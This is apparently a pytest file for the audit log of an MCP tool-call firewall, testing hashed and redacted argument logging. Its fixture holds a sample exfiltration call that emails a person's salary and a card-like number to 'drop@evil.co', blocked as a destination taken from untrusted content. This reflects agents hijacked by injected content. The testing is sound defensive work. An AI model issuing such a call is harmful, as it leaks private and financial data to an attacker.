from __future__ import annotations

import json
from datetime import datetime, timezone

import pytest

from mcpfw.audit import AuditLog, args_sha256, read_events, redacted_preview
from mcpfw.policy import ALLOW, Action, Decision, RuleHit

FIXED = datetime(2026, 11, 6, 12, 0, tzinfo=timezone.utc)
SECRET_ARGS = {"to": "drop@evil.co", "body": "salary of Priya is 120000, account 4111222233334444"}
BLOCK_R1 = Decision(
    Action.BLOCK, (RuleHit("R1", "tainted_destination", Action.BLOCK, "'evil.co' from untrusted content"),)
)


def make_log(tmp_path):
    return AuditLog(tmp_path / "logs" / "audit.jsonl", session_id="s1", clock=lambda: FIXED)


def test_log_call_writes_one_json_line(tmp_path):
    log = make_log(tmp_path)
    log.log_call("ws__send_email", SECRET_ARGS, BLOCK_R1, mode="enforce", forwarded=False, latency_ms=1.234)

    lines = log.path.read_text("utf-8").splitlines()
    assert len(lines) == 1
    record = json.loads(lines[0])
    assert record == {
        "ts": "2026-11-06T12:00:00+00:00",
        "session": "s1",
        "event": "call",
        "tool": "ws__send_email",
        "args_sha256": args_sha256(SECRET_ARGS),
        "args_preview": "{to: str(12), body: str(51)}",
        "action": "BLOCK",
        "rule": "R1 tainted_destination",
        "reason": "'evil.co' from untrusted content",
        "hits": ["R1"],
        "mode": "enforce",
        "approved": None,
        "forwarded": False,
        "latency_ms": 1.23,
        "error": None,
    }


def test_argument_values_never_reach_the_log(tmp_path):
    log = make_log(tmp_path)
    log.log_call("ws__send_email", SECRET_ARGS, ALLOW, mode="enforce", forwarded=True)
    text = log.path.read_text("utf-8")
    for secret in ("Priya", "120000", "4111", "drop@evil.co"):
        assert secret not in text


def test_allow_has_no_rule_or_reason(tmp_path):
    record = make_log(tmp_path).log_call("t", {}, ALLOW, mode="monitor", forwarded=True)
    assert record["action"] == "ALLOW" and record["rule"] is None and record["reason"] is None


def test_log_is_append_only_and_readable(tmp_path):
    log = make_log(tmp_path)
    log.log_tool("weather__get", status="quarantined", reason="fake_tag")
    log.log_call("t", {"a": 1}, ALLOW, mode="enforce", forwarded=True)
    AuditLog(log.path, session_id="s2").log_call("t", None, ALLOW, mode="enforce", forwarded=True)

    events = list(read_events(log.path))
    assert [e["event"] for e in events] == ["tool", "call", "call"]
    assert [e["session"] for e in events] == ["s1", "s1", "s2"]
    assert events[0]["status"] == "quarantined"


def test_args_hash_is_order_independent():
    assert args_sha256({"a": 1, "b": 2}) == args_sha256({"b": 2, "a": 1})
    assert args_sha256(None) == args_sha256({})


def test_preview_shapes_and_truncation():
    preview = redacted_preview({"n": 3, "flag": True, "items": [1, 2], "meta": {"k": "v"}, "none": None})
    assert preview == "{n: int, flag: bool, items: list(2), meta: dict(1), none: NoneType}"
    long = redacted_preview({f"field_{i}": "x" for i in range(20)})
    assert len(long) <= 80 and long.endswith("…}")


def test_corrupt_line_reports_line_number(tmp_path):
    path = tmp_path / "audit.jsonl"
    path.write_text('{"event": "call"}\nnot json\n', encoding="utf-8")
    with pytest.raises(ValueError, match=r"audit.jsonl:2: invalid JSON"):
        list(read_events(path))
